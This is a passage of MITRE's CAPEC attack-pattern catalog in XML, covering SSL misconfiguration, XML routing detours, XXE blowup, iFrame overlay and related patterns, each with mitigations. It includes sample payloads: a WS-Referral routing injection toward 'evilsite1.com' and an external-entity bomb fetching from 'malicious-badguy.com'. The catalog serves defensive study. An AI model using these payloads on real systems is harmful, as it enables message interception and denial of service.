               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Resources_Required, Solutions_and_Mitigations</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2015-12-07">Abuse of Communication Channels</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="217" Name="Exploiting Incorrectly Configured SSL" Abstraction="Standard" Status="Draft">
         <Description>An adversary takes advantage of incorrectly configured SSL communications that enables access to data intended to be encrypted. The adversary may also use this type of attack to inject commands or other traffic into the encrypted stream to cause compromise of either the client or server.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="216"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>Determine the configuration levels of either the server or client being targeted, preferably both. This is not a hard requirement, as the attacker can simply assume commonly exploitable configuration settings and blindly attempt them.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>Provide controlled access to the server by the client, by either providing a link for the client to click on, or by positioning one's self at a place on the network to intercept and control the flow of data between client and server, e.g. MITM (man in the middle).</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>Insert the malicious data into the stream that takes advantage of the configuration flaw.</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>Access to the client/server stream.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">The attacker needs real-time access to network traffic in such a manner that the attacker can grab needed information from the SSL stream, possibly influence the decided-upon encryption method and options, and perform automated analysis to decipher encrypted material recovered. Tools exist to automate part of the tasks, but to successfully use these tools in an attack scenario requires detailed understanding of the underlying principles.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>The attacker needs the ability to sniff traffic, and optionally be able to route said traffic to a system where the sniffing of traffic can take place, and act upon the recovered traffic in real time.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Usage of configuration settings, such as stream ciphers vs. block ciphers and setting timeouts on SSL sessions to extremely low values lessens the potential impact. Use of later versions of TLS (e.g. TLS 1.1+) can also be effective, but not all clients or servers support the later versions.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>Using MITM techniques, an attacker launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the attacker to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="201"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Description Summary</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2015-12-07">Exploiting Incorrectly Configured SSL Security Levels</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="218" Name="Spoofing of UDDI/ebXML Messages" Abstraction="Detailed" Status="Draft">
         <Description>An attacker spoofs a UDDI, ebXML, or similar message in order to impersonate a service provider in an e-business transaction. UDDI, ebXML, and similar standards are used to identify businesses in e-business transactions. Among other things, they identify a particular participant, WSDL information for SOAP transactions, and supported communication protocols, including security protocols. By spoofing one of these messages an attacker could impersonate a legitimate business in a transaction or could manipulate the protocols used between a client and business. This could result in disclosure of sensitive information, loss of message integrity, or even financial fraud.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="148">
               <Exclude_Related Exclude_ID="512"/>
               <Exclude_Related Exclude_ID="515"/>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The targeted business's UDDI or ebXML information must be served from a location that the attacker can spoof or compromise or the attacker must be able to intercept and modify unsecured UDDI/ebXML messages in transit.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>The attacker must be able to force the target user to accept their spoofed UDDI or ebXML message as opposed to the a message associated with a legitimate company. Depending on the follow-on for the attack, the attacker may also need to serve its own web services.</Resource>
         </Resources_Required>
         <Mitigations>
            <Mitigation>Implementation: Clients should only trust UDDI, ebXML, or similar messages that are verifiably signed by a trusted party.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="345"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="219" Name="XML Routing Detour Attacks" Abstraction="Standard" Status="Draft">
         <Description>An attacker subverts an intermediate system used to process XML content and forces the intermediate to modify and/or re-route the processing of the content. XML Routing Detour Attacks are Man in the Middle type attacks. The attacker compromises or inserts an intermediate system in the processing of the XML message. For example, WS-Routing can be used to specify a series of nodes or intermediaries through which content is passed. If any of the intermediate nodes in this route are compromised by an attacker they could be used for a routing detour attack. From the compromised system the attacker is able to route the XML process to other nodes of his or her choice and modify the responses so that the normal chain of processing is unaware of the interception. This system can forward the message to an outside entity and hide the forwarding and processing from the legitimate processing systems by altering the header information.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="94"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Survey the target] Using command line or an automated tool, an attacker records all instances of web services to process XML requests.</Description>
               <Technique>Use automated tool to record all instances to process XML requests or find exposed WSDL.</Technique>
               <Technique>Use tools to crawl WSDL</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Identify SOAP messages that have multiple state processing.] Inspect instance to see whether the XML processing has multiple stages or not.</Description>
               <Technique>Inspect the SOAP message routing head to see whether the XML processing has multiple stages or not.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Launch an XML routing detour attack] The attacker injects a bogus routing node (using a WS-Referral service) into the routing table of the XML header of the SOAP message identified in the Explore phase. Thus, the attacker can route the XML message to the attacker controlled node (and access the message contents).</Description>
               <Technique>The attacker injects a bogus routing node (using a WS-Referral service) into the routing table of the XML header of the SOAP message</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The targeted system must have multiple stages processing of XML content.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">To inject a bogus node in the XML routing table</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>The attacker must be able to insert or compromise a system into the processing path for the transaction.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Accountability</Scope>
               <Scope>Authentication</Scope>
               <Scope>Authorization</Scope>
               <Scope>Non-Repudiation</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Design: Specify maximum number intermediate nodes for the request and require SSL connections with mutual authentication.</Mitigation>
            <Mitigation>Implementation: Use SSL for connections between all parties with mutual authentication.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>Here is an example SOAP call from a client, example1.com, to a target, example4.com, via 2 intermediaries, example2.com and example3.com. (note: The client here is not necessarily a 'end user client' but rather the starting point of the XML transaction).</xhtml:p>
               <xhtml:div style="margin-left:10px;">
                  <xhtml:div style="color:#32498D; font-weight:bold;">Example SOAP message with routing information in header:</xhtml:div>
                  <xhtml:div style="margin-left:10px;">&amp;lt;S:Envelope&amp;gt; &amp;lt;S:Header&amp;gt; &amp;lt;m:path xmlns:m="http://schemas.example.com/rp/" S:actor="http://schemas.example.com/soap/actor" S:mustUnderstand="1"&amp;gt; &amp;lt;m:action&amp;gt;http://example1.com/&amp;lt;/m:action&amp;gt; &amp;lt;m:to&amp;gt;http://example4.com/router&amp;lt;/m:to&amp;gt; &amp;lt;m:id&amp;gt;uuid:1235678-abcd-1a2b-3c4d-1a2b3c4d5e6f&amp;lt;/m:id&amp;gt; &amp;lt;m:fwd&amp;gt; &amp;lt;m:via&amp;gt;http://example2.com/router&amp;lt;/m:via&amp;gt; &amp;lt;/m:fwd&amp;gt; &amp;lt;m:rev /&amp;gt; &amp;lt;/m:path&amp;gt; &amp;lt;/S:Header&amp;gt; &amp;lt;S:Body&amp;gt; ... &amp;lt;/S:Body&amp;gt; &amp;lt;/S:Envelope&amp;gt;</xhtml:div>
                  <xhtml:div>Add an additional node (example3.com/router) to the XML path in a WS-Referral message</xhtml:div>
                  <xhtml:div style="margin-left:10px;">&amp;lt;r:ref xmlns:r="http://schemas.example.com/referral"&amp;gt; &amp;lt;r:for&amp;gt; &amp;lt;r:prefix&amp;gt;http://example2.com/router&amp;lt;/r:prefix&amp;gt; &amp;lt;/r:for&amp;gt; &amp;lt;r:if/&amp;gt; &amp;lt;r:go&amp;gt; &amp;lt;r:via&amp;gt;http://example3.com/router&amp;lt;/r:via&amp;gt; &amp;lt;/r:go&amp;gt; &amp;lt;/r:ref&amp;gt;</xhtml:div>
               </xhtml:div>
               <xhtml:div style="margin-left:10px;" class="result">
                  <xhtml:div style="color:#32498D; font-weight:bold;">Resulting in the following SOAP Header:</xhtml:div>&amp;lt;S:Envelope&amp;gt; &amp;lt;S:Header&amp;gt; &amp;lt;m:path xmlns:m="http://schemas.example.com/rp/" S:actor="http://schemas.example.com/soap/actor" S:mustUnderstand="1"&amp;gt; &amp;lt;m:action&amp;gt;http://example1.com/&amp;lt;/m:action&amp;gt; &amp;lt;m:to&amp;gt;http://example4.com/router&amp;lt;/m:to&amp;gt; &amp;lt;m:id&amp;gt;uuid:1235678-abcd-1a2b-3c4d-1a2b3c4d5e6f&amp;lt;/m:id&amp;gt; &amp;lt;m:fwd&amp;gt; &amp;lt;m:via&amp;gt;http://example2.com/router&amp;lt;/m:via&amp;gt; &amp;lt;m:via&amp;gt;http://example3.com/router&amp;lt;/m:via&amp;gt; &amp;lt;/m:fwd&amp;gt; &amp;lt;m:rev /&amp;gt; &amp;lt;/m:path&amp;gt; &amp;lt;/S:Header&amp;gt; &amp;lt;S:Body&amp;gt;<xhtml:br/>...<xhtml:br/>&amp;lt;/S:Body&amp;gt; &amp;lt;/S:Envelope&amp;gt;</xhtml:div>
               <xhtml:p>In the following example, the attacker injects a bogus routing node (using a WS-Referral service) into the routing table of the XML header but not access the message directly on the initiator/intermediary node that he/she has targeted.</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="attack">
                  <xhtml:div style="color:#32498D; font-weight:bold;">Example of WS-Referral based WS-Routing injection of the bogus node route:</xhtml:div>&amp;lt;r:ref xmlns:r="http://schemas.example.com/referral"&amp;gt; &amp;lt;r:for&amp;gt; &amp;lt;r:prefix&amp;gt;http://example2.com/router&amp;lt;/r:prefix&amp;gt; &amp;lt;/r:for&amp;gt; &amp;lt;r:if/&amp;gt; &amp;lt;r:go&amp;gt; &amp;lt;r:via&amp;gt;http://evilsite1.com/router&amp;lt;/r:via&amp;gt; &amp;lt;/r:go&amp;gt; &amp;lt;/r:ref&amp;gt;</xhtml:div>
               <xhtml:div style="margin-left:10px;" class="result">
                  <xhtml:div style="color:#32498D; font-weight:bold;">Resulting XML Routing Detour attack:</xhtml:div>&amp;lt;S:Envelope&amp;gt; &amp;lt;S:Header&amp;gt; &amp;lt;m:path xmlns:m="http://schemas.example.com/rp/" S:actor="http://schemas.example.com/soap/actor" S:mustUnderstand="1"&amp;gt; &amp;lt;m:action&amp;gt;http://example_0.com/&amp;lt;/m:action&amp;gt; &amp;lt;m:to&amp;gt;http://example_4.com/router&amp;lt;/m:to&amp;gt; &amp;lt;m:id&amp;gt;uuid:1235678-abcd-1a2b-3c4d-1a2b3c4d5e6f&amp;lt;/m:id&amp;gt; &amp;lt;m:fwd&amp;gt; &amp;lt;m:via&amp;gt;http://example2.com/router&amp;lt;/m:via&amp;gt; &amp;lt;m:via&amp;gt;http://evilesite1.com/router&amp;lt;/m:via&amp;gt; &amp;lt;m:via&amp;gt;http://example3.com/router&amp;lt;/m:via&amp;gt; &amp;lt;/m:fwd&amp;gt; &amp;lt;m:rev /&amp;gt; &amp;lt;/m:path&amp;gt; &amp;lt;/S:Header&amp;gt; &amp;lt;S:Body&amp;gt; ... &amp;lt;/S:Body&amp;gt; &amp;lt;/S:Envelope&amp;gt;</xhtml:div>
               <xhtml:p>Thus, the attacker can route the XML message to the attacker controlled node (and access to the message contents).</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="441"/>
            <Related_Weakness CWE_ID="610"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-80" Section="WASC-32 - Routing Detour"/>
            <Reference External_Reference_ID="REF-81"/>
            <Reference External_Reference_ID="REF-65"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="22" Name="Exploiting Trust in Client" Abstraction="Meta" Status="Draft">
         <Description>An attack of this type exploits vulnerabilities in client/server communication channel authentication and data integrity. It leverages the implicit trust a server places in the client, or more importantly, that which the server believes is the client. An attacker executes this type of attack by placing themselves in the communication channel between client and server such that communication directly to the server is possible where the server believes it is communicating only with a valid client. There are numerous variations of this type of attack.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Prerequisites>
            <Prerequisite>Server software must rely on client side formatted and validated values, and not reinforce these checks on the server side.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">The attacker must have fairly detailed knowledge of the syntax and semantics of client/server communications protocols and grammars</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>Ability to communicate synchronously or asynchronously with server</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Design: Ensure that client process and/or message is authenticated so that anonymous communications and/or messages are not accepted by the system.</Mitigation>
            <Mitigation>Design: Do not rely on client validation or encoding for security purposes.</Mitigation>
            <Mitigation>Design: Utilize digital signatures to increase authentication assurance.</Mitigation>
            <Mitigation>Design: Utilize two factor authentication to increase authentication assurance.</Mitigation>
            <Mitigation>Implementation: Perform input validation for all remote content.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>Web applications may use JavaScript to perform client side validation, request encoding/formatting, and other security functions, which provides some usability benefits and eliminates some client-server round-tripping. However, the web server cannot assume that the requests it receives have been subject to those validations, because an attacker can use an alternate method for crafting the HTTP Request and submit data that contains poisoned values designed to spoof a user and/or get the web server to disclose information.</Example>
            <Example>Web 2.0 style applications may be particularly vulnerable because they in large part rely on existing infrastructure which provides scalability without the ability to govern the clients. Attackers identify vulnerabilities that either assume the client side is responsible for some security services (without the requisite ability to ensure enforcement of these checks) and/or the lack of a hardened, default deny server configuration that allows for an attacker probing for weaknesses in unexpected ways. Client side validation, request formatting and other services may be performed, but these are strictly usability enhancements not security enhancements.</Example>
            <Example>Many web applications use client side scripting like JavaScript to enforce authentication, authorization, session state and other variables, but at the end of day they all make requests to the server. These client side checks may provide usability and performance gains, but they lack integrity in terms of the http request. It is possible for an attacker to post variables directly to the server without using any of the client script security checks and customize the patterns to impersonate other users or probe for more information.</Example>
            <Example>Many message oriented middleware systems like MQ Series are rely on information that is passed along with the message request for making authorization decisions, for example what group or role the request should be passed. However, if the message server does not or cannot authenticate the authorization information in the request then the server's policy decisions about authorization are trivial to subvert because the client process can simply elevate privilege by passing in elevated group or role information which the message server accepts and acts on.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="290"/>
            <Related_Weakness CWE_ID="287"/>
            <Related_Weakness CWE_ID="20"/>
            <Related_Weakness CWE_ID="200"/>
            <Related_Weakness CWE_ID="693"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Description Summary, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2015-12-07">Exploiting Trust in Client (aka Make the Client Invisible)</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="220" Name="Client-Server Protocol Manipulation" Abstraction="Standard" Status="Draft">
         <Description>An adversary takes advantage of weaknesses in the protocol by which a client and server are communicating to perform unexpected actions. Communication protocols are necessary to transfer messages between client and server applications. Moreover, different protocols may be used for different types of interactions. For example, an authentication protocol might be used to establish the identities of the server and client while a separate messaging protocol might be used to exchange data. If there is a weakness in a protocol used by the client and server, an attacker might take advantage of this to perform various types of attacks. For example, if the attacker is able to manipulate an authentication protocol, the attacker may be able spoof other clients or servers. If the attacker is able to manipulate a messaging protocol, the may be able to read sensitive information or modify message contents. This attack is often made easier by the fact that many clients and servers support multiple protocols to perform similar roles. For example, a server might support several different authentication protocols in order to support a wide range of clients, including legacy clients. Some of the older protocols may have vulnerabilities that allow an attacker to manipulate client-server interactions.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="272"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The client and/or server must utilize a protocol that has a weakness allowing manipulation of the interaction.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>The adversary must be able to identify the weakness in the utilized protocol and exploit it. This may require a sniffing tool as well as packet creation abilities. The adversary will be aided if they can force the client and/or server to utilize a specific protocol known to contain exploitable weaknesses.</Resource>
         </Resources_Required>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="757"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="221" Name="XML External Entities Blowup" Abstraction="Detailed" Status="Draft">
         <Description>This attack takes advantage of the entity replacement property of XML where the value of the replacement is a URI. A well-crafted XML document could have the entity refer to a URI that consumes a large amount of resources to create a denial of service condition. This can cause the system to either freeze, crash, or execute arbitrary code depending on the URI.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="122"/>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="278"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>A server that has an implementation that accepts entities containing URI values.</Prerequisite>
         </Prerequisites>
         <Mitigations>
            <Mitigation>This attack may be mitigated by tweaking the XML parser to not resolve external entities. If external entities are needed, then implement a custom XmlResolver that has a request timeout, data retrieval limit, and restrict resources it can retrieve locally.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>In this example, the XML parser parses the attacker's XML and opens the malicious URI where the attacker controls the server and writes a massive amount of data to the response stream. In this example the malicious URI is a large file transfer.</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">&lt;?xml version="1.0"?&gt;<xhtml:br/>&lt; !DOCTYPE bomb [<xhtml:br/>&lt;!ENTITY detonate SYSTEM "http://www.malicious-badguy.com/myhugefile.exe"&gt;<xhtml:br/>]&gt;<xhtml:br/>&lt;bomb&gt;&amp;detonate;&lt;/bomb&gt;</xhtml:div>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="611"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2018-07-31">XML External Entities</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="222" Name="iFrame Overlay" Abstraction="Detailed" Status="Draft">
         <Description>In an iFrame overlay attack the victim is tricked into unknowingly initiating some action in one system while interacting with the UI from seemingly completely different system. While being logged in to some target system, the victim visits the attackers' malicious site which displays a UI that the victim wishes to interact with. In reality, the iFrame overlay page has a transparent layer above the visible UI with action controls that the attacker wishes the victim to execute. The victim clicks on buttons or other UI elements they see on the page which actually triggers the action controls in the transparent overlaying layer. Depending on what that action control is, the attacker may have just tricked the victim into executing some potentially privileged (and most undesired) functionality in the target system to which the victim is authenticated. The basic problem here is that there is a dichotomy between what the victim thinks he or she is clicking on versus what he or she is actually clicking on.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="103"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Craft an iFrame Overlay page] The attacker crafts a malicious iFrame overlay page.</Description>
               <Technique>The attacker leverages iFrame overlay capabilities to craft a malicious iFrame overlay page.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Exploit</Phase>
               <Description>[Attacker tricks victim to load the iFrame overlay page] Attacker utilizes some form of temptation, misdirection or coercion to trick the victim to loading and interacting with the iFrame overlay page in a way that increases the chances that the victim will visit the malicious page.</Description>
               <Technique>Trick the victim to the malicious site by sending the victim an e-mail with a URL to the site.</Technique>
               <Technique>Trick the victim to the malicious site by manipulating URLs on a site trusted by the victim.</Technique>
               <Technique>Trick the victim to the malicious site through a cross-site scripting attack.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Trick victim into interacting with the iFrame overlay page in the desired manner] The attacker tricks the victim into clicking on the areas of the UI which contain the hidden action controls and thereby interacts with the target system maliciously with the victim's level of privilege.</Description>
               <Technique>Hide action controls over very commonly used functionality.</Technique>
               <Technique>Hide action controls over very psychologically tempting content.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The victim is communicating with the target application via a web based UI and not a thick client. The victim's browser security policies allow iFrames. The victim uses a modern browser that supports UI elements like clickable buttons (i.e. not using an old text only browser). The victim has an active session with the target system. The target system's interaction window is open in the victim's browser and supports the ability for initiating sensitive actions on behalf of the user in the target system.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">Crafting the proper malicious site and luring the victim to this site is not a trivial task.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Authorization</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Accountability</Scope>
               <Scope>Authentication</Scope>
               <Scope>Authorization</Scope>
               <Scope>Non-Repudiation</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Configuration: Disable iFrames in the Web browser.</Mitigation>
            <Mitigation>Operation: When maintaining an authenticated session with a privileged target system, do not use the same browser to navigate to unfamiliar sites to perform other activities. Finish working with the target system and logout first before proceeding to other tasks.</Mitigation>
            <Mitigation>Operation: If using the Firefox browser, use the NoScript plug-in that will help forbid iFrames.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>The following example is a real-world iFrame overlay attack [2]. In this attack, the malicious page embeds Twitter.com on a transparent IFRAME. The status-message field is initialized with the URL of the malicious page itself. To provoke the click, which is necessary to publish the entry, the malicious page displays a button labeled "Don't Click." This button is aligned with the invisible "Update" button of Twitter. Once the user performs the click, the status message (i.e., a link to the malicious page itself) is posted to his/ her Twitter profile.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="1021"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-84"/>
            <Reference External_Reference_ID="REF-85"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="224" Name="Fingerprinting" Abstraction="Meta" Status="Stable">
         <Description>An adversary compares output from a target system to known indicators that uniquely identify specific details about the target. Fingerprinting by itself is not usually detrimental to the target. However, the information gathered through fingerprinting often enables an adversary to discover existing weaknesses in the target.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Very Low</Typical_Severity>
         <Prerequisites>
            <Prerequisite>A means by which to interact with the target system directly.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">Some fingerprinting activity requires very specific knowledge of how different operating systems respond to various TCP/IP requests. Application fingerprinting can be as easy as envoking the application with the correct command line argument, or mouse clicking in the appropriate place on the screen.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>If on a network, the adversary needs a tool capable of viewing network communications at the packet level and with header information, like Mitmproxy, Wireshark, or Fiddler.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>While some information is shared by systems automatically based on standards and protocols, remove potentially sensitive information that is not necessary for the application's functionality as much as possible.</Mitigation>
         </Mitigations>
